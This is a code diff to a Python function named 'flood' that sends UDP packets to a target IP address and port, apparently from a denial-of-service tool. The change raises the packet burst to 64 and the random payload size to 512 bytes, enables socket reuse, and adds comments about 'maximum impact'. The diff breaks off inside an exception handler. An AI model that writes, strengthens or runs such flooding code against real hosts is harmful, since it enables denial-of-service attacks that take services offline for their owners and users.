@@ -4,19 +4,27 @@ from colorama import Fore
 import tools.randomData as randomData
 
 
-# Create socket
+# Create socket with optimized options
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+# Enable socket reuse to handle rapid packet sending
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 
 def flood(target: tuple[str, int]) -> None:
     """Send UDP packets to target.
     
+    Optimized version with increased packet burst and socket optimization.
+    
     Args:
         target: Tuple of (ip_address, port)
     """
-    for _ in range(16):
+    # Increased packet burst for maximum impact
+    PACKET_COUNT = 64
+    
+    for _ in range(PACKET_COUNT):
         try:
-            payload = randomData.random_bytes(1, 60)
+            # Generate payload with variable size for diversity
+            payload = randomData.random_bytes(1, 512)
             sock.sendto(payload, (target[0], target[1]))
         except PermissionError:
             print(
